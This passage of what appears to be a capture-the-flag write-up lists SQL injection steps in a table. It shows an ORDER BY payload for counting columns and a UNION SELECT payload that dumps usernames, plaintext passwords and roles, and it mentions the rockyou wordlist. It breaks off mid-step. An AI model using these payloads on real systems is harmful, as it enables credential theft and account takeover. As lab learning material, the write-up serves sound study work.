...
| 5. Find the number of columns:<br>```' ORDER BY [number] --``` | <img width="600" height="1014" alt="sql1" src="https://github.com/user-attachments/assets/2cf3133b-586a-417e-982f-bdd54d4f660c" /> |
...
|10. Enumerate username , password and role :<br>```' UNION SELECT null,username,null,password,role,null,null FROM NCTFDBUsers --```|<img width="600" height="588" alt="sql3" src="https://github.com/user-attachments/assets/14ec5b41-8926-4db1-8835-1f6ab80f81ba" /><br>we found admin user and password that plain text user.<br>youwill`rockyou`?|
|11. Let's extisting username and password to the text.<br> then edit ○○.txt like this| 
